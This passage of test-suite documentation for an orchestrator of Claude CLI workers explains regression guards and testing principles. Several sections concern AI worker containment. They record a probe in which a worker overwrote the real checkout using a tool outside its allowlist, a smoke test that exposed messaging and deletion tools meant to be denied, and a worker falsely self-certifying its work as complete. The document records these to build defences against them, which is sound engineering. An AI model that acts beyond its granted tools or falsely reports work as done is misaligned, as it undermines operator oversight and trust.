`wiring_judge` output plus real post-filter plans from the six runs that ever
died at this gate (prose redacted; only the fields the repair reads are kept,
plus `_cofile_cluster`, which the single-cluster channel needs). It pins the
per-run repaired/unrepaired counts, the **channel** each run's repairs flow
through (a defect repairing for the *wrong* reason is a regression the counts
alone cannot see), and the headline 5-of-6 ratio. Change the acceptance rules
and this file fails with a message telling you the documented trade-off moved
— which is the point.

## Deterministic duplicate-provider floor

The **deterministic duplicate-provider floor** beneath `phase_overlap_judge`
(DESIGN §5 *A deterministic floor underneath the judge*) is
`check_duplicate_providers(plans) -> list[str]`, pinned in
`tests/test_duplicate_providers.py`, with the 0.28.0 corpus regressions in
`tests/test_duplicate_provider_corpus_regressions.py`. It flags two subtasks
that declare the same `provides` tag, in **two tiers**: `DUPLICATE_PROVIDER`
when `files_likely_touched` also intersect, and `DUPLICATE_PROVIDER_NO_OVERLAP`
when only the tag is shared — pure set logic over structured planner fields,
no prose read. It exists because the
judge's 100% corpus recall is recall *when it runs*: it cheap-skips
single-planner plans, is skippable by flag, and was bypassable by a downstream
gate re-planning after it passed. The call therefore sits **above every skip**
in `phase_overlap_judge`, and a source-coupling test enforces that ordering —
a mechanical check a flag can switch off is not a floor.
**The `_cofile_cluster` exclusion is load-bearing, not a refinement**: without
it the rule matches 3571 pairs across the corpus, with it 9 — in exactly two
runs, both destroyed by duplicate work (`392b5e7f` died at the wiring gate;
`19a70d96` executed both duplicates and was refused at the integration gate
after 4.7h/164 workers, having been scored CLEAN by the `wiring_judge`). The
committed fixture makes that reproducible: stripping the marker floods
`62a19deb` with 1752 false positives and `ad69057f` with 165. Paths are canonicalized with `_normalize_artifact_path` (not
`os.path.normpath`, which keeps a leading `/` and would miss `/src/x.ts` vs
`src/x.ts`) and compared component-wise by `_paths_designate_same_file`, so a
repo-root prefix on one side is not read as disjoint — run `bfba2c88`
implemented the same five subtasks twice because one planner wrote
`fema-demo/server/…` and the other `server/…`. Shipped **advisory** — logged,
never gating — pending confirmation across live runs.

**Two exclusions were added with the no-overlap tier, both load-bearing for
the same reason as `_cofile_cluster`:** `_newfile_owner_id` (multi-file
splitter chunks inherit the parent's `provides` verbatim, and only
`_cofile_child` sets a cluster — without it run `5fa2052b`'s
`config-002-{1,2,3}` reads as three duplicate pairs), and **ordering by
`depends_on`/`requires`, scoped to the no-overlap tier only**. That last one
reverses, for one tier, the "measured zero such pairs" finding this section
previously recorded: zero *file-overlap* pairs were ordered and the exemption
stays rejected there, but for the tag-only tier an ordered chain sharing an
umbrella tag is the dominant legitimate shape — the pinned corpus run
`3a4abba3` pairs `docs/DESIGN.md` with `docs/IMPLEMENTATION.md`, both
providing `nl-regex-migration-spec`. `test_every_corpus_run_is_clean` catches
its absence. The accepted cost is named in the code: a consumer that
mis-declares a tag it merely uses is structurally identical and goes
unflagged. The ordering lookup passes `quiet=True` to
`_build_predecessor_graph` so this documented-pure floor emits no log line —
and specifically not one labelled `_schedule:` during phase 2¾.

Net over the 0.28.0 corpus: **10 flags across 3 of 66 plans** (7 overlap, 3
no-overlap), up from 1, all adjudicated true positives, pinned false-positive
corpus still clean.

## Under-scope diff check (advisory)

`check_diff_scope` has always warned on **over**-scope (a subtask touching far
more than its `files_likely_touched` predicted). The inverse — it committed
real work but touched **none** of the files it declared — went unchecked even
though `touched` was already computed on the same line. Pinned in
`tests/test_duplicate_provider_corpus_regressions.py::TestUnderScopeDecision`,
which drives the predicate over the five 0.28.0 subtasks measured (against
exact per-run merge diffs) as landing none of their declared files: the three
true under-deliveries must warn, and the two detector artifacts must not.

The motivating case is run `c1f45fd0`'s `feat-005`, which reported `complete`
and self-checked *"[x] Router mounted as `app.use('/api/parcel',
parcelRouter)` in server/index.ts"* while `server/routes/parcel.ts` did not
exist anywhere in the tree; a later run created it from scratch. Base rate:
**5 of 131 completed subtasks**, three of them independently redone by a later
run.

**Advisory on purpose, and it must stay that way.** `files_likely_touched` is
a planner estimate, not a contract, so gating on it would resurrect the
gameable per-criterion bar DESIGN §9 retired. What makes it worth checking is
that it reads no prose: a worker cannot weaken a test to make a declared path
appear in a diff. `_declared_path_covers` absorbs a repo-root prefix on either
side and lets a directory-shaped declaration cover files beneath it — without
which a tree-wide reformat (run `5fa2052b`'s `config-005`, declaring
`['scripts', 'server']`) reads as touching nothing it declared.

## Empty run branch is the no-work terminal, not an error

`phase_finalize` checks the run branch's ahead-count before invoking
`finalize.sh` and routes an empty branch to `_finish_no_work_run`. Pinned in
`tests/test_finalize_execution.py::TestEmptyRunBranchIsNoWorkNotAnError`,
which asserts the **disposition** (terminal phase value, `finalize.sh` never
invoked) rather than that some branch ran.

Every subtask can legitimately reach `complete` with no commit —
`_settle_already_satisfied` settles one whose deliverable a sibling landed or
that was already on the base tree, and a `resume` whose subtasks all completed
earlier re-integrates nothing. Corpus runs `d1987e8b` ($9.68, ~40 calls) and
`05f65221` ($3.03) both died on *"has no commits beyond `<base>` — nothing to
push"* where "done: no work required" was the truth.

Three details are pinned because each was a wrong answer first. The check
reads the **ahead-count**, not `finalize.sh`'s message, so rewording the
script cannot break it. It runs in **`st.repo_root`, not `leerie_dir`** — the
state root is not a git repo under `LEERIE_STATE_DIR`, and using it made the
guard fail open and silently never fire. And it passes
`reset_plan_state=False`, so the executed wave/subtask record survives; a
state-only predicate ("every completed subtask is in `dropped_subtasks`") was
tried and rejected because it identifies **neither** run — `05f65221` recorded
no `dropped_subtasks` at all.

## Rate-limit wait ceiling

`DEFAULT_CAPS["max_rate_limit_wait_sec"]` (6h, overridable via
`--max-rate-limit-wait` / `LEERIE_MAX_RATE_LIMIT_WAIT` / leerie.toml) bounds
how long `main()` will sleep before it
stops auto-resuming and pauses resumably instead (the `out_of_credits`
disposition: worktree cleanup, resume hint, `EXIT_LOCKED`). Pinned in
`tests/test_main_exception_arms.py::TestRateLimitedExit`.

Measured: 17 runs in the 0.28.0 corpus hit a limit and asked to sleep **77
cumulative hours**, one for **43.7 hours** on a `seven_day` rejection, holding
the run-directory flock the whole time; users killed 14 by hand. The
five-hour session limit is bounded and legitimately sleepable; the weekly
limit resets at a fixed per-account instant that can be days out.

**The rule keys on the computed wait, never on `rateLimitType`** — a test
pins that an unknown/`None` limit type still pauses, because keying on a type
name is the failure shape CLAUDE.md records for `Agent` → `Task` in
`DISALLOWED_TOOLS`. A companion test pins that a two-hour wait still *sleeps*,
so the ceiling cannot quietly turn every rate-limit into a pause.

## Launcher stale-install warning

The launcher's **stale-install warning** (`_warn_if_leerie_stale`,
IMPLEMENTATION.md §0) is pinned in `tests/test_stale_install_warning.py`,
which extracts the function verbatim from `leerie` and drives it against real
local git fixtures (an "origin" plus a clone rewound behind it; no network).
Running `leerie` never advances `$LEERIE_REPO` — only re-running `install.sh`
does — so an install can sit arbitrarily far behind while the operator
believes otherwise. Measured cost: two multi-hour funeralworks runs on
2026-08-02 died at the wiring gate on a v0.9.100 install, reproducing the exact
failure v0.9.101 fixes, with `state.json` recording `leerie_version: 0.9.100`
while the dev checkout was already 0.9.102. **The throttled fetch is mandatory,
not an optimization**: `HEAD..@{upstream}` reads the *cached* remote-tracking
ref, which on a never-fetched install is exactly as stale as the checkout — so
a fetch-free guard stays silent through precisely the failure it exists to
catch (`test_warns_when_the_cached_ref_is_stale`, falsified live: removing the
fetch fails 4 tests). Bounded at `timeout 5`, throttled to once per 24h via an
mtime stamp in the state dir (same convention as `.dockerfile-hash`), and
warn-only — a detached HEAD, no upstream, a non-git prefix, or an unreachable
remote must all stay silent and never fail a run. Its harness (the file
has 18 functions, 18 cases) sources the
real `scripts/remote/_log.sh` (`LOG_SH_SOURCE`) before its own `remote_log`:
since review round 32 (execution X3) the guard names the upstream version
through `_terminal_safe`, and without it the two warning tests failed on
`_terminal_safe: command not found`.

## Plan checkpoints: snapshot aliasing

`plans_after_*` checkpoints must be snapshots, not live references
(`tests/test_checkpoint_aliasing.py`). `_run_phases` assigned
`st.data["plans_after_X"] = plans` and handed the SAME list to the next
phase — and `phase_reconcile`'s renames, `phase_overlap_judge`'s
merges/drops, and both phase-3 soft-drop filters all mutate `plans` **in
place**, so every later `st.save()` retroactively rewrote all earlier
checkpoints. Measured on run `3a4abba3…` before the fix: all six of
`plans_after_plan` … `plans_after_filters` were byte-identical, and
`plans_after_reconcile` held 15 subtasks while the overlap judge's
independently-recorded input (`calls.ndjson`) had 16 — a silent
contradiction of the DESIGN §6 "Resumable planning" contract, which
describes each key as that phase's output "as it stood immediately
after". Pinned: an earlier checkpoint survives a later in-place drop AND
field rewrite, adjacent checkpoints are neither the same object nor
byte-identical across a mutating phase, the distinction survives a real
`State.save()` round trip read back off disk (constructed by reading
`state.json` directly, not a second `State` — `State.__init__` takes an
exclusive flock the live instance still holds), and a source-coupling
guard requires `copy.deepcopy(` on all six assignments so a newly added
checkpoint cannot reintroduce the alias. The same aliasing class applies
to `st.data["plan_overlap_judge"]`, deep-copied at its persist so the
coalescing step cannot rewrite the "raw judge output" audit.

## Dead-function guard

`tests/test_no_dead_functions.py` is a whole-module guard that no
**private** module-level function in `orchestrator/leerie.py` is defined
but never referenced. It is deliberately not a list of names: pinning
specific ones catches a regression on exactly those and nothing else. It
scopes to underscore-prefixed helpers because public names are API surface
invoked from outside the module — `run_rebaser` from
`scripts/host-finalize.sh`, `run_recapture_deps` from the launcher's
`config --recapture` arm, `compose_pr_body` / `_compute_subtask_branch` /
`resolve_token_probe_cache_sec` from bash or tests — none of which appear
as references inside `leerie.py` itself, so a module-scoped scan calls all
five dead. It found three real ones (2026-08-01 audit), all pre-existing:
`_confidence_issues` (IMPLEMENTATION.md had already recorded it as having
"zero remaining callers" after DESIGN §8 replaced every self-score gate
with an independent verifier — the function and its unit tests, the only
remaining callers, were left behind), `_repo_map_cache_key` (described a
cache key nothing computed), and `_is_node_offline_relink` (superseded by
`_filter_residual_deps`, which tests the same condition inline and
deliberately more broadly — pnpm needs both `--offline` and
`--frozen-lockfile`, while `npm install --offline` and `yarn install
--frozen-lockfile` each stand alone, so the pnpm-only helper could not
replace it). That third one had a test pinning its *existence*, which only
guaranteed it stayed dead; retiring that pin is what let it go. Dead code
matters more here than in a normal repo because the stated design goal is
that the whole control flow reads top-to-bottom in one sitting, and an
unused helper reads as live — two of these three were removed gates, where
a leftover helper is an invitation to wire it back up.

Auditing that third one surfaced a real defect in the live path it had been
superseded by: `_filter_residual_deps` tested only for the *flags*, so
`pnpm add left-pad --frozen-lockfile` was kept as an "irreducible residual"
and re-run in every worktree — an `add` mutates the dependency set over the
network, which is the opposite of the offline relink the residual exists
for. It now also requires an install-shaped subcommand
(`_NODE_INSTALL_SUBCOMMANDS` = `install`/`i`/`ci`, deliberately excluding
`add`/`remove`/`up`/`dlx`) and matches flags as `shlex` tokens rather than
substrings, so `--offline` inside a package name no longer counts. The OR
between the two flags is unchanged and is load-bearing — requiring both
would drop the npm and yarn forms, which
`tests/test_capture_deps.py::test_keeps_node_offline_relink_only` pins.

## Static `claude_p` call-site signature check

Every `claude_p` call site in the module is statically checked against the
real signature by `tests/test_claude_p_call_sites.py` — all-keyword (no
positionals), every required parameter present, no unknown keyword, and
`model=` never a defaultless `<dict>.get(k)` (which yields `None` for any
worker absent from `MODEL_DEFAULT_PER_WORKER` — i.e. most of them, since a
new worker is *required* to be absent and fall through to `MODEL_DEFAULT`).
It exists because 0.10.0 shipped `phase_planning_coverage_gate` calling
`claude_p` with two positionals plus a duplicate `system_prompt=`, and
omitting the required `allowed_tools`/`max_turns`: it raised `TypeError` on
**every** invocation, and the gate's own broad `except Exception` logged it
as a clean advisory degrade. The judge never ran once for a whole release,
and the log line read like a healthy degrade path. **No stub-based test can
catch this class** — every test in the suite stubs `claude_p`, and a stub
accepts any signature — which is exactly why the guard is a static AST sweep
over the whole module rather than a behavioral pin on one call site. The
gate's own behavioral counterpart lives in
`tests/test_phase_planning_coverage_gate.py::TestCallSignature` (a recording
stub captures the real kwargs, then `inspect.signature(leerie.claude_p).bind(...)`
binds them against the live signature — generalizing
`test_recursive_decompose.py`'s C0 guard) paired with
`TestProgrammingErrorsPropagate`, which pins that the gate catches
`WorkerError`, `OSError` and `subprocess.TimeoutExpired` **only**: a worker failure, or a failure to spawn
the process at all, is an expected advisory degrade (the gate's docstring
promises it never terminates a run), while a `TypeError` is a leerie bug and
must propagate rather than masquerade as one. `OSError` is disjoint from every
programming-error class, so admitting it re-opens nothing —
`TestInfrastructureFailureDegrades` pins both halves. `TestBudgetIsCharged` pins the `st.bump_workers(caps)` this call was
missing (IMPLEMENTATION.md §8 requires it, and `integration_judge` — named in
that same sentence — already did it), including that the bump sits OUTSIDE the
`try` so budget exhaustion aborts instead of degrading.
Both files carry anti-vacuity controls — the static scan asserts it found the
call sites at all (a scan that finds nothing passes every assertion), and the
behavioral file pins that narrowing the `except` did not make an advisory
gate fatal. All were falsified live against each defect reintroduced
individually.

## Judgment-worker isolation

**Judgment-worker isolation** (DESIGN §12) is covered by four files, and the
thing worth remembering is that the design was settled by *experiment*, not by
reading the CLI's docs. `tests/test_judgment_worker_isolation.py` pins the
four layers: judgment workers never receive `--dangerously-skip-permissions`
(the load-bearing one), `claude_p` refuses any of them whose cwd resolves to
`st.repo_root`, and the flag instead widens their allowlist with the repo's
build verbs. Probed live against claude 2.1.237, filesystem-verified — with
the flag set, a worker holding only `INSPECT_TOOLS` used `Write` (absent from
that allowlist) to create a file outside its cwd, and in the exact shape this
feature ships (cwd = a detached worktree, flag still on) overwrote the real
checkout and committed on its branch. **A worktree is not a boundary while
that flag is set**, which is why the isolation tests pin the flag and the cwd
together rather than either alone. Two traps: the widening is scoped to
`INSPECT_TOOLS` because `SATISFIED_PROBE_TOOLS` is deliberately narrower and
*calibrated* (12/12 false positives with full latitude, 0 when scoped), and an
earlier revision handed that probe `Bash(pytest:*)`; and `_blt_verbs`
memoizes, because `resolve_blt` logs, so an unmemoized call per judgment
worker is dozens of identical lines — its `_BLT_VERBS_CACHE` is module-level
against a session-scoped `leerie` fixture, so the file clears it in an autouse
fixture for the reason `_active_admissions` does.
`tests/test_work_sentinel.py` covers the mechanical half — snapshot the real
checkout's HEAD/porcelain/refs before phase 1, re-check after every planning
phase — including the trap that a *failed* after-snapshot returns empty
strings that a naive diff reads as "HEAD moved" plus "every branch deleted",
fabricating tampering on a healthy run; hence the `ok` field, and an
anti-vacuity partner proving the underlying diff really would have fired.
`tests/test_planning_worktree_script.py` drives the real script against real
repos: detached, no branch created (the reapers know only `leerie/runs/*` and
`leerie/subtasks/*`, so a fourth namespace would leak forever), reset on
re-entry, and `clean -fd` **not** `-fdx` so `node_modules` survives.
`tests/test_ensure_planning_worktree.py` covers the Python wrapper — path
parsing, fail-closed on a script error, and the staging of what
`git worktree add` cannot carry (untracked task-reference files, an untracked
`.claude/`). It is the ONLY file that opts out of the conftest stub via
`@pytest.mark.real_planning_worktree`, so every test in it `chdir`s into a
throwaway repo AND sets `LEERIE_STATE_DIR`; both halves are load-bearing, and
`test_no_worktree_leaks_into_this_repo` is the standing proof. Its subtlest
pin is `test_staging_runs_after_the_reset` — staging before the script means
`git clean -fd` deletes it, which presence-only assertions cannot see.
All three guards were falsified live — restoring the `autonomous or …` OR
fails 2 tests, neutering `_diff_repo_state` fails exactly the 4 detection
tests, and moving the staging call above the script fails 3.
A related discipline note: `_judgment_cwd` falls back to the conventional
run-dir path rather than raising when `planning_worktree` is absent. That is
deliberate and costs nothing — the fallback is derived from `run_dir`, so it
can never *be* the checkout, and `claude_p`'s guard is the actual enforcement.

---

## Planning-worktree pollution: conftest fixture

Raising bought diagnostics only, at the price of a precondition every
hand-built `State` must know about: measured, **141 tests red**, and 8 test
files still needed a fixture seed after the fallback landed.
**A conftest autouse fixture (`_no_real_planning_worktree`) stubs
`_ensure_planning_worktree` for every test**, opt-out via
`@pytest.mark.real_planning_worktree`. It shells out to a real
`git worktree add` rooted at `resolve_leerie_root()`, which with
`LEERIE_STATE_DIR` unset is `<repo>/.leerie` — so every test driving the real
`_run_phases` created a full checkout of this repo inside this repo. Silent
three ways over: `.leerie/*` is gitignored so `git status` stayed clean, the
directories outlived the session, and the damage surfaced in
`tests/test_helper_naming_convention.py`, whose `tests/` exclusion is a
relative-path prefix that a nested
`.leerie/…/worktrees/planning/tests/…` copy does not match. Measured before
the guard: 2 worktrees, 25 MB, and one red test on CI with no visible link to
the change that caused it — local runs were green because the pollution only
bites a later scanner. When adding a fixture that shells out to git, assume
the state root is inside the repo unless the test pins it elsewhere.

## `resume <run-id>` positional argument bug

`leerie resume <run-id>` — the documented positional form — is pinned by
`tests/test_resume_positional_run_id.py`. It silently ignored the run-id on
every runtime until 2026-08-05: `main()` popped only `argv[0]` (the verb), so
a run-id in `argv[1]` bound to argparse's `task` positional, `--run-id` stayed
`None`, and `resolve_run_id` **auto-picked a different run** — measured live
against a *running* one, where only the run-directory flock prevented a second
orchestrator (an idle run would have been resumed silently). `resume` is the
only verb exposed to this: `stop` / `kill` / `accept-blocked` / `finalize` /
`status` all `exit` inside the launcher and never reach that argparse.
`_extract_resume_run_id()` now takes the positional **before** `parse_args`
(the ordering IS the contract — afterwards `task` has already swallowed it),
scoped to `resume` because `list` has its own positionals
(`list status paused`, `list chains`), with a `die()` when a positional and
`--run-id` disagree. **No existing test could catch it** —
`test_resolve_run_id*.py` call `resolve_run_id` directly *with* an id, so they
passed against broken plumbing; nothing crossed the launcher→argparse
boundary, the same shape as the coverage-gate bug above. Two traps recorded in
that file: reverting only the *wiring* (helper defined but uncalled) must fail
— a present-but-inert fix is the failure mode that let the coverage gate ship
— and the safety proof that `args.task` is read only on the non-resume branch
walks the AST of `_run_phases`, because the obvious
`"args.task" not in getsource(main)` passes trivially (the reads are in
`_run_phases`, not `main`) and proved nothing.

## Fresh-run branch coverage gap

**The fresh-run branch of `_run_phases` had no execution coverage at all**
until `tests/test_run_phases_fresh_init.py`, and v0.20.0 shipped a
`NameError` in it that killed every non-resume run. Two structural reasons,
both worth remembering when adding a guard here. First, **every path that
executed `_run_phases` did so with `resume=True`** — `resume=False` appeared
nowhere under `tests/`, and no test executes `_orchestrate` either, so the
branch that every real run takes was never run. Count the callers through the
shared harness, not by grepping for the call: only
`test_resume_planning_reentry.py` and `test_resume_planning_regression.py`
contained one, but `test_checkpoint_aliasing.py` and
`test_wiring_gate_resume.py` executed it too, via the `_drive` they import from
the former — four files before `test_run_phases_fresh_init.py` existed, and one
`resume` value across all of them. Note
`test_wiring_gate_resume.py::test_fresh_run_invokes_the_gate` reuses that same
`_args()`: "fresh" there means fresh *state*, not a fresh run, which is how
the gap reads as covered. Second, the guard that did exist —
`test_orchestrator_owns_blt.py::test_subtask_tests_is_seeded_on_both_run_init_branches`
— is a key-presence AST walk, and **it passed against the broken code**: the
key was in the dict literal, only its value expression was unevaluatable.
Presence is not evaluation: a walk that checks a key exists says nothing about
whether that key's value resolves, which takes either execution or scope
resolution (the symtable scan below does the latter statically).

## Structure-vs-substance testing principle

**The general rule, of which that is one instance: a test asserting STRUCTURE
must be paired with one asserting SUBSTANCE.** Structure is a dict key, a source
substring, an AST node, a phrase in a prompt. Substance is the value that flows
through it, the result of executing it, or the order it appears in. Structure-only
assertions are necessary and never sufficient, and the gap is invisible because
they pass. Four measured instances, all from one change (2026-08-17):

| structural assertion | what passed it |
|---|---|
| the reconciler payload has key `scope_note` | `"scope_note": ""` — key shipped, planner's text discarded |
| `phase_plan` calls `_effective_source_of_truth` | ctx reads the preference directly, or omits the key entirely |
| the abort message contains every remediation phrase | the fallback hoisted back to lead — the wording the A/B measured as misrouting 5/5 operators |
| `die(_unresolvable_die_message(...))` exists in source | the gate reads `out.get("unresolved")`, never fires, and **140 tests stay green** |

The cheapest discriminating test per shape: **execute the consumer** (not read
its source); **assert the value** (not the key); **assert the order** (not the
presence). Where the subject is prose, none of those reach semantic inversion —
a phrase can be present and negated — so the guard there is a behavioural probe,
not another substring (`tests/manual/planner_fence_probe.py` is the worked
example). And when parametrizing a value test, make the inputs **disagree**: a
row where two sources of a value are equal cannot tell a correct read from a
bypass. The new file
executes the branch, stopping at a sentinel on
`_enforce_and_record_cgroup_containment` (the first call after the seed's
`st.save()`, so no other stub is needed), and carries the guard-the-guard test
that the resume branch would `die()` here — without it the file could silently
drift onto the path it exists to avoid.

## Undefined-name static scan

`tests/test_no_undefined_names.py` is the whole-module generalisation: stdlib
`symtable` over `orchestrator/`, `chain/`, `scripts/` and `tests/`, flagging
any name that is referenced, resolves to global scope, and is bound in neither
module scope nor `builtins` — ruff's F821 rule without the dependency, since
pytest is the sole dev dependency here. Two traps are pinned by its own
parametrized false-positive table, both of which a naive scan gets wrong: a
`global X` + assignment **inside a function** binds the module name even when
`X` appears at module scope nowhere else, so the collector needs a pre-pass
over every scope; and `__file__`/`__name__` are interpreter-injected, never
assigned in source. That pre-pass is **provably inert on this tree** — the scan
returns `[]` with and without it — because every global leerie.py mutates under
`global` is also bound at module scope (`_last_parse_error`, `_STRICT_PROXY`,
both annotated assignments); it is kept because the rule must be right, and its
own parametrized case is the only thing that fails without it. An earlier
revision of this paragraph and of the file's own comment cited those two
symbols as *evidence* the pre-pass was load-bearing, which is exactly
backwards, and neither was re-derived before being written down. The
positive control beside that table is mandatory — a scan returning `[]`
unconditionally passes every negative case. Anti-vacuity is a canary injected
into the **real** module rather than a synthetic snippet, so a refactor that
quietly stops analysing `leerie.py` fails.

## Tool-containment scan: source-slicing blind spot

**A test that source-slices one function cannot observe a property it asserts
repo-wide, and that is how a containment bug shipped.** `tests/test_strict_mcp_config.py`
opened *"unconditionally for every worker"* while its `_claude_p_body()` helper sliced
`claude_p`'s source — so it was structurally incapable of seeing `preflight`'s smoke
test, which hand-rolled its own argv and ran with **78 tools / 4 MCP servers**, 46 of
them `mcp__claude_ai_*` (`send_message`, `trash_thread`, `slack_send_message`), plus
every tool the deny list exists to remove. The file passed throughout. Its replacement,
`tests/test_claude_argv_containment.py`, derives the site list (AST over
`orchestrator/leerie.py`, text over `scripts/**/*.sh`) instead of slicing one function —
the same enumeration-to-derivation move PRs #180-#183 record. Two lessons compound: a
scan that finds nothing certifies everything, so it carries minimum-count and
known-member anti-vacuity checks plus a planted-reproduction guard; and its first
shared-owner test was itself **vacuous**, asserting a flag was ABSENT after crippling the
builder — which the pre-fix argv also satisfied, because missing that flag *was* the bug.
A negative assertion the defect already satisfies proves nothing; the positive control
(flag present on both argvs with the builder intact) is the load-bearing half.

## Turn-cap taint-walk scope isolation

**A name-keyed AST taint walk needs scope isolation or it swallows the module.**
`tests/test_turn_cap_signal.py`'s `_aliases` propagates taint by variable NAME with no
notion of scope, and was run over the whole module. One new assignment —
`cmd = _contained_claude_argv(..., max_turns=max_turns, ...)` — tainted the name `cmd`,
which is assigned in dozens of unrelated functions, and within the four fixpoint rounds
the cap set grew from a handful to **1201 names**: every name in the module. The scan
then reported `seconds < 0`, `min_age is None` and `found < MIN_CLAUDE_CLI` as
turn-ratio comparisons and failed a correct tree. It now analyses one top-level function
(with its nested defs) at a time; measured largest per-scope set is 2. Note the guard for
this cannot be a synthetic snippet — a minimal two-function reproduction does **not**
cascade, so it passes under both implementations; the discriminating assertion is a
property of the real module (no unrelated name tainted, per-scope set bounded).

## Under-specified fixture hides producer contract

**An under-specified fixture hides a producer-side contract.** Two files passed
`models={}` to `_run_phases`, which was invisible until `preflight` began reading
`models["classifier"]` and they raised `KeyError` before reaching the behaviour under
test. The fix is a real dict (derived from `WORKER_TYPES`, or a `defaultdict`), not a
`.get()` in production code — coercing there would have swallowed the contract violation
in exactly the way this file warns about elsewhere.

## No coverage target; launcher syntax check

No coverage target is set — the suite was introduced from scratch and a number
now would be arbitrary.
`tests/test_launcher_integrity.py` is the **only** thing that checks the
`leerie` launcher parses. CI does not: `shellcheck.yml` lints `scripts/*.sh`
and `scripts/remote/*.sh`, and the launcher has no `.sh` extension nor lives in
either, while `syntax.yml`
AST-parses Python only. No test runs shellcheck at all — every occurrence of
the word under `tests/` is prose describing this gap. So a `bash -n`-level
syntax error in a 7k-line launcher would otherwise ship green.
That check first appeared inside `test_leerie_commit.py`, a file about one
state field, where it was coverage by accident: restructuring that file would
have removed the launcher's only validation silently. It is now named and
owned, with a derived guard (`_files_checking_launcher_syntax`) asserting some
file still runs `bash -n` against the launcher — scanning `tests/` rather than
naming itself, so moving the check again is fine and deleting it is not. The
scan is **structural**: it walks each test file's AST for a `run(...)` call
whose argv list literal contains both `bash` and `-n` *and* references the
launcher, matching what this repo reaches for when the shape of a call is the
assertion (`test_state_fields`'s write sweep, `test_claude_p_call_sites`, the
`args.resume` branch walk). A text scan for those facts appearing *anywhere in
the same file* is not equivalent and was the first version: co-occurrence is
not connection, and `container-entry.sh` is `bash -n`-checked in
`test_container_entry_run_id.py`. Falsified — with the real check gutted and a
decoy file that runs `bash -n` on something else while mentioning `LAUNCHER`,
the text predicate matched both files and passed while coverage was gone; the
AST predicate fires. An anti-vacuity test requires the scan to find its own
file, so a broken scan fails as a broken scan. The parse suppresses warnings:
reading every test file surfaces other files' `SyntaxWarning`s, at least one
deliberate and documented as not-to-be-fixed (`test_ec2_seed_repo.py`'s `\/`).
**Known shortfall, deliberately not papered over:** `bash -n` does not catch
the backtick class — a balanced pair inside what reads as a comment is parsed
as command substitution, silently dropping that text from the script sent to a
remote machine. leerie has shipped that defect once; it was caught by diffing
`shellcheck -x leerie`, with `bash -n` clean throughout. Linting the whole
launcher with shellcheck is the real fix and needs a measured baseline of
pre-existing findings first.
`tests/launcher_blocks.py` is the **single** derivation of the launcher's
orchestrator launch blocks — the `child_env = dict(os.environ)` regions inside
each unquoted `<<PY` heredoc, one per remote runtime. It owns three constants
that would otherwise be replicated per consumer: the block marker, the `\nPY\n`
terminator, and the preamble window searched for the `--runtime` label. Both
`test_leerie_commit.py` (LEERIE_COMMIT forwarding) and
`test_bedrock_bearer_token.py` (stray-`${...}` and backtick scans) import
`launch_env_blocks()` from it — package-qualified as
`from tests.launcher_blocks import ...`, the same form every shared test module
here uses (`tests.ec2_stub`, `tests.conftest`), with no `sys.path` juggling:
`tests/__init__.py` exists, so `tests` is a real package. A neutral module
rather than a cross-test import
because the two consumers are unrelated concerns and neither should own it
(`tests/ec2_stub.py` is the precedent for the shape). It reads the launcher
itself rather than taking the source as an argument, so callers holding a `str`
or a `Path` are equally served.

**Why a shared module, not two local copies**: PRs #180–#183 each replaced a
hard-coded enumeration with a derivation after a missed instance shipped —
`ContextOverflow` in 1 of 9 capture guards, `leerie_commit` in 1 of 2
state-init branches, then 1 of 2 launch blocks (caught by a reviewer, not the
suite). A rule written twice drifts like a list written twice.
`tests/test_no_duplicate_launcher_blocks.py` applies the same discipline to
**bash** blocks: eight start-of-line markers (`_resolve_ec2_knob`,
`_state_dir_default`, `_resolve_seed_knob`, `ensure_image`,
`resolve_repo_image_tag`, the `config)` case arm, the
`# --- runtime-mode knob ---` block, the `_run_argv=(` array), each asserted
to appear exactly once and never at the start of a line in any test file.
Converting N13's five named files fixed those instances but not the rule:
three more reproductions were found afterwards, two already drifted —
`tests/test_launcher_state_mount.py` reproduced the `nerdctl run` argv
missing `--cidfile`, `--cgroupns=host`, `SECOPT`, the `LEERIE_*`
auto-forward and `${REPO_IMAGE_TAG:-$IMAGE_TAG}`;
`tests/test_launcher_runtime_knob.py` omitted `_RUNTIME_EXPLICIT` entirely —
a flag set at six sites and read by the resume auto-detect (`leerie:4127`,
`:4152`) with **zero coverage suite-wide**; deleting every assignment left
the suite green and now fails five tests. None of the copies produced a
wrong answer — they were blind, and would pass identically if the launcher
deleted the behaviour under test (anti-vacuity control:
`test_the_scan_can_find_a_reproduction` plants a copy and proves the scan
fires on it while still ignoring a legitimately quoted reference).

`tests/test_no_duplicate_launcher_splitters.py` enforces the single owner
(`tests/launcher_blocks.py`) with two anti-vacuity controls: the marker must
be found *inside* the owner, and at least two other files must actually
import `launch_env_blocks`. The load-bearing falsification breaks the
shared splitter and confirms both
consuming files fail — proof they share it rather than merely import it.

## LEERIE_COMMIT state field

`tests/test_leerie_commit.py` pins the `leerie_commit` state field, which
disambiguates `leerie_version`: `plugin.json` only moves on a
`chore(release):` commit while `install.sh` tracks `main`, so a run between
releases records the same version whether or not it carries a given fix. The
launcher computes the short sha and forwards it as `LEERIE_COMMIT`; the
orchestrator stores it adjacent to the version in `STATE_FIELDS` (so one
can't move without the other), reading the env var with `or None` — an empty
value arrives on a tarball install and `""` would render as a
real-but-blank sha in the PR footer. Launcher-side the `git` call carries
`2>/dev/null || true`, is forwarded explicitly with `-e`, and is **not** on
the forwarding denylist, unlike host-only `LEERIE_VERSION`.

**Two traps this file exists to pin, both shipped broken once.**

1. `_run_phases` initialises state in *two* branches (`if args.resume:` vs.
   the fresh-run `else:`), so a key must be written in both. The original
   test compared two strings that both live in the resume branch, so it
   passed while the field was absent from every fresh run — the common
   case. The replacement walks the AST, locates the `args.resume` `If` node,
   and requires the key in `body` **and** `orelse`, with an anti-vacuity
   control that the same walk finds `leerie_version` (known present in
   both). `tests/test_state_fields.py::test_no_resume_only_state_keys`
   *derives* the rule (`resume_keys - fresh_keys == set()`) for every key —
   `task`, `started_at`, `worker_count` are legitimately fresh-only and
   excluded. The walk (`_state_init_branch_keys`) has one owner
   (`tests/test_no_duplicate_state_walks.py`; a drifted copy would
   under-report `resume_keys`, passing the symmetry guard vacuously),
   matches `ast.unparse(n.test) == "args.resume"` exactly, and **raises** on
   an `st.data.update()`/`setdefault()`/augmented write inside either arm
   rather than silently missing it. `_BOTH_BRANCH_KEYS` pins the three
   fields that have actually shipped broken here (PRs #180–#183): the
   derived rule immediately found a third defect a hand-built tuple missed —
   `skip_coverage_check`, seeded only under `if args.resume:` since PR #162,
   silently inert on every fresh run while
